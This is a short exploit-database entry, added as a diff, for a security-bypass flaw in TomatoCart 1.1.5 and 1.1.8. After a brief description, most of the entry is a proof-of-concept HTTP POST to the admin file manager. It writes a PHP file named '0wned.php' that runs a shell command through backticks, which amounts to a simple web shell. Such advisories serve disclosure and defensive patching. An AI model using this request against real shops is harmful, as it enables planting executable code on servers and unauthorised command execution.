@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/57156/info
+
+TomatoCart is prone to a security-bypass vulnerability.
+
+An attacker can exploit this issue to bypass certain security restrictions and create files with arbitrary shell script which may aid in further attacks.
+
+TomatoCart versions 1.1.5 and 1.1.8 are vulnerable. 
+
+POST /admin/json.php HTTP/1.1
+Host: localhost
+Cookie: admin_language=en_US; toCAdminID=edfd1d6b88d0c853c2b83cc63aca5e14
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 195
+
+module=file_manager&action=save_file&file_name=0wned.php&directory=/&token=edfd1d6b88d0c853c2b83cc63aca5e14&ext-comp-1277=0wned.php&content=<?+echo '<h1>0wned!</h1><pre>';+echo `ls+-al`; ?> 
